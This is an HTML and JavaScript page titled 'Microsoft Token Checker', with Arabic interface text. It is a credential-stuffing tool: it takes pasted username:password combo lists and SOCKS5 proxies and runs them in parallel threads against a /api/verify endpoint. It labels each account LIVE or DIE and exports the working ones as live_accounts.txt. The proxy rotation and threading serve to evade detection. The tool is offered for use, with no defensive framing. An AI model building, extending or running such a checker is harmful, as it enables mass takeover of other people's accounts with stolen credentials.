<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Advanced Microsoft Validator v3.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        body { font-family: 'Tajawal', sans-serif; background-color: #050811; }
        .custom-scroll::-webkit-scrollbar { width: 4px; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #2563eb; border-radius: 10px; }
    </style>
</head>
<body class="text-slate-300 p-4">

    <div class="max-w-6xl mx-auto">
        <div class="bg-slate-900/50 p-6 rounded-3xl border border-slate-800 mb-6 flex flex-col md:flex-row justify-between items-center gap-4">
            <div>
                <h1 class="text-2xl font-black text-blue-500 tracking-tighter">MICROSOFT TOKEN CHECKER</h1>
                <p class="text-slate-500 text-xs">نظام فحص الهوية المتطور - دقة 100%</p>
            </div>
            <div class="flex gap-2">
                <button onclick="downloadResults()" class="bg-green-600/20 text-green-400 border border-green-600/30 px-4 py-2 rounded-xl hover:bg-green-600 hover:text-white transition text-xs font-bold">تحميل الشغال (LIVE)</button>
                <button onclick="isRunning = false" class="bg-red-600/20 text-red-400 border border-red-600/30 px-4 py-2 rounded-xl hover:bg-red-600 hover:text-white transition text-xs font-bold">إيقاف</button>
            </div>
        </div>

        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6 text-center">
            <div class="bg-slate-900 p-4 rounded-2xl border border-slate-800"><p class="text-slate-500 text-xs">الكل</p><p id="total" class="text-2xl font-bold">0</p></div>
            <div class="bg-slate-900 p-4 rounded-2xl border border-blue-500/30"><p class="text-blue-400 text-xs text-right">فحص</p><p id="check" class="text-2xl font-bold">0</p></div>
            <div class="bg-slate-900 p-4 rounded-2xl border border-green-500/30"><p class="text-green-400 text-xs text-right">LIVE</p><p id="live" class="text-2xl font-bold text-green-500">0</p></div>
            <div class="bg-slate-900 p-4 rounded-2xl border border-red-500/30"><p class="text-red-400 text-xs text-right">DIE</p><p id="die" class="text-2xl font-bold text-red-500">0</p></div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <div class="lg:col-span-4 space-y-4">
                <div class="bg-slate-900 p-5 rounded-3xl border border-slate-800">
                    <label class="text-xs font-bold text-slate-500 block mb-2">الكومبو (user:pass)</label>
                    <textarea id="combo" class="w-full h-40 bg-black/40 border border-slate-800 rounded-2xl p-3 text-[10px] font-mono outline-none focus:border-blue-600 transition"></textarea>
                    
                    <label class="text-xs font-bold text-slate-500 block mt-4 mb-2">البروكسي (SOCKS5)</label>
                    <textarea id="proxy" class="w-full h-20 bg-black/40 border border-slate-800 rounded-2xl p-3 text-[10px] font-mono outline-none focus:border-cyan-600 transition" placeholder="ip:port"></textarea>
                    
                    <div class="flex gap-2 mt-4">
                        <input type="number" id="thr" value="5" class="w-16 bg-slate-800 border-none rounded-xl text-center text-sm">
                        <button onclick="startCheck()" id="btn" class="flex-1 bg-blue-600 hover:bg-blue-500 py-3 rounded-xl font-bold text-white shadow-lg shadow-blue-900/40 transition">بدء الفحص</button>
                    </div>
                </div>
            </div>

            <div class="lg:col-span-8 bg-slate-900 rounded-3xl border border-slate-800 overflow-hidden flex flex-col h-[500px]">
                <div class="overflow-y-auto custom-scroll flex-1">
                    <table class="w-full text-right text-[11px]">
                        <thead class="bg-black/20 sticky top-0 backdrop-blur-md">
                            <tr><th class="p-3">الحساب</th><th class="p-3">البروكسي</th><th class="p-3 text-center">الحالة</th></tr>
                        </thead>
                        <tbody id="resTable" class="divide-y divide-white/5"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script>
        let isRunning = false; let liveList = [];
        async function startCheck() {
            const list = document.getElementById('combo').value.trim().split('\n').filter(i => i.includes(':'));
            const proxies = document.getElementById('proxy').value.trim().split('\n').filter(p => p !== "");
            const threads = parseInt(document.getElementById('thr').value);
            if(!list.length) return;

            isRunning = true; document.getElementById('btn').disabled = true;
            document.getElementById('total').innerText = list.length;
            let current = 0, lCount = 0, dCount = 0;

            const worker = async () => {
                while(current < list.length && isRunning) {
                    const acc = list[current++];
                    document.getElementById('check').innerText = parseInt(document.getElementById('check').innerText) + 1;
                    const prx = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
                    
                    const row = document.getElementById('resTable').insertRow(0);
                    row.insertCell(0).className = "p-3 opacity-70"; row.cells[0].innerText = acc.split(':')[0];
                    row.insertCell(1).className = "p-3 opacity-40"; row.cells[1].innerText = prx || "Direct";
                    const status = row.insertCell(2); status.className = "p-3 text-center font-bold";
                    status.innerHTML = `<span class="text-blue-500">Checking...</span>`;

                    try {
                        const r = await fetch('/api/verify', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ account: acc, proxy: prx })
                        });
                        const data = await r.json();
                        if(data.status === 'SUCCESS') {
                            status.innerHTML = `<span class="text-green-500">LIVE</span>`;
                            lCount++; document.getElementById('live').innerText = lCount;
                            liveList.push(acc);
                        } else {
                            status.innerHTML = `<span class="text-red-500">DIE</span>`;
                            dCount++; document.getElementById('die').innerText = dCount;
                        }
                    } catch(e) { status.innerText = "Error"; dCount++; }
                    document.getElementById('check').innerText = parseInt(document.getElementById('check').innerText) - 1;
                }
            };

            const pool = Array(threads).fill(null).map(() => worker());
            await Promise.all(pool);
            document.getElementById('btn').disabled = false; isRunning = false;
        }

        function downloadResults() {
            const blob = new Blob([liveList.join('\n')], {type: 'text/plain'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'live_accounts.txt'; a.click();
        }
    </script>
</body>
</html>
